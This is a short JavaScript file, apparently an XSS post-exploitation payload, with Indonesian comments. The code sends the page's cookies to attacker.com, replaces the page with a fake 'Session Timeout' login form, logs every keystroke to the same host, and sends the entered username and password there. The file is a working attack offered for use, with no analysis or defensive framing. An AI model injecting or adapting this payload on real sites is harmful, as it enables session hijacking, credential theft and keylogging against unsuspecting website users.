// tools/xss-post-exploit/malicious.js

// 1. Kirim cookie ke server attacker
fetch("http://attacker.com/steal?cookie=" + document.cookie);

// 2. Ganti halaman untuk phishing
document.body.innerHTML = `
  <h2>ðŸ”’ Session Timeout</h2>
  <p>Your session has expired. Please login again.</p>
  <form onsubmit="stealCreds(event)">
    <input id="user" placeholder="Username" /><br>
    <input id="pass" placeholder="Password" type="password" /><br>
    <button type="submit">Login</button>
  </form>
`;

// 3. Keylogger - log semua penekanan tombol
document.addEventListener("keydown", function(e) {
  fetch("http://attacker.com/log?key=" + e.key);
});

// 4. Fungsi pencurian kredensial
function stealCreds(e) {
  e.preventDefault();
  const u = document.getElementById("user").value;
  const p = document.getElementById("pass").value;
  fetch(`http://attacker.com/creds?u=${u}&p=${p}`);
}
